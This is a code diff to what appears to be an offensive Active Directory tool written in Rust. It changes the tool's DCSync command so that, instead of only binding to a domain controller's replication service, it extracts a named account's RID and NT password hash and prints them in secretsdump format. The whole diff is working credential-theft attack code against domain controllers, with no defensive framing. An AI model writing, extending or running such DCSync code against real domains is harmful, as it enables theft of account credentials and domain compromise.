@@ -247,16 +247,16 @@ async fn rbcd(a: RbcdArgs) -> Result<()> {
 async fn dcsync(a: DcsyncArgs) -> Result<()> {
     use adhammer_dcerpc::drsuapi::DrsSession;
     let mut sess = DrsSession::bind(&a.host, &a.domain, &a.user, &a.password).await?;
-    let handle_hex: String = sess.handle().iter().map(|b| format!("{b:02x}")).collect();
-    println!("[+] DRSBind OK — sealed replication handle {handle_hex}");
     match a.target {
-        None => println!("    (no --target: bind-only check)"),
+        None => {
+            let handle_hex: String = sess.handle().iter().map(|b| format!("{b:02x}")).collect();
+            println!("[+] DRSBind OK — sealed replication handle {handle_hex} (no --target: bind-only check)");
+        }
         Some(t) => {
-            let guid = sess.crack_name_to_guid(&a.domain, &t).await?;
-            let g: String = guid.iter().map(|b| format!("{b:02x}")).collect();
-            println!("[+] DRSCrackNames: {}\\{} → objectGUID {g}", a.domain, t);
-            let reply = sess.get_nc_changes(&guid).await?;
-            println!("[+] DRSGetNCChanges returned {} bytes of replication data", reply.len());
+            let (rid, nt) = sess.dcsync(&a.domain, &t).await?;
+            let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
+            // secretsdump format: user:rid:lmhash:nthash:::  (LM is the empty-string hash)
+            println!("{}:{}:aad3b435b51404eeaad3b435b51404ee:{}:::", t, rid, nthex);
         }
     }
     Ok(())
